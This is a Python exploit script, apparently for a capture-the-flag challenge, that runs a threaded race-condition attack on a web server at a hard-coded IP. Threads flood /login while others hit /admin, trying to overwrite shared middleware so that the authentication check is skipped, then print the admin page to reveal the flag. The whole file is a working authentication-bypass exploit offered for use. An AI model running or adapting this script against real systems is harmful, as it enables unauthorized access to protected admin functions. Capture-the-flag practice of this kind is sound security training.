import requests
import threading
import sys

# TARGET IP from your challenge
TARGET = "http://154.57.164.76:32079"

# Shared flag to stop threads once we win
stop_threads = False

def pollution_worker(sess):
    """
    Sends requests to a public endpoint (/login).
    This tries to overwrite the shared middleware slot with a standard handler
    that DOES NOT block execution (unlike RequireAuth).
    """
    global stop_threads
    while not stop_threads:
        try:
            # We use /login because it's a valid public route
            sess.get(f"{TARGET}/login")
        except:
            pass

def admin_worker(sess):
    """
    Spams the admin endpoint.
    If the race succeeds, RequireAuth is replaced by LoginHandler.
    The server will return 200 OK and likely the Dashboard content mixed with Login content.
    """
    global stop_threads
    while not stop_threads:
        try:
            resp = sess.get(f"{TARGET}/admin")
            
            # If we bypassed auth, we won't get redirected to /login
            # We will likely get a 200 OK or the dashboard HTML
            if "Dashboard" in resp.text or "Welcome" in resp.text:
                print(f"\n[+] BOOM! Auth Bypassed!")
                print(f"[+] Response length: {len(resp.text)}")
                print("-" * 30)
                # Dump a snippet of the body to see the flag
                print(resp.text[:500]) 
                print("-" * 30)
                stop_threads = True
                return
            elif resp.status_code == 200 and "Login" not in resp.text:
                # Catch-all for success
                print(f"\n[+] Possible hit! Status 200")
                print(resp.text)
                stop_threads = True
        except:
            pass

def main():
    print(f"[*] Starting Race Condition exploit against {TARGET}")
    print("[*] Spawning threads... (Ctrl+C to stop manually)")

    # Use a session for connection pooling (faster requests)
    sess = requests.Session()
    
    threads = []
    
    # Spawn "Polluters" (create the noise)
    for _ in range(10):
        t = threading.Thread(target=pollution_worker, args=(sess,))
        t.daemon = True
        t.start()
        threads.append(t)

    # Spawn "Checkers" (try to enter admin)
    for _ in range(10):
        t = threading.Thread(target=admin_worker, args=(sess,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not stop_threads:
            pass
    except KeyboardInterrupt:
        print("\n[*] Stopping...")

if __name__ == "__main__":
    main()